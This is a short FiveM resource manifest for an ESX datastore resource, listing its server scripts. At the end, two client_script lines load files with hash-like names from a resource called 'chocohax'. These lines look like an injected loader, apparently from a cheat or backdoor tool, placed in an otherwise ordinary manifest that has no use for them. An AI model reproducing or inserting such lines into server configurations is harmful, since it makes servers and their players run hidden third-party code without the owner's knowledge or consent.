resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Data Store'

version '1.0.2'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server/classes/datastore.lua',
	'server/main.lua'
}

client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'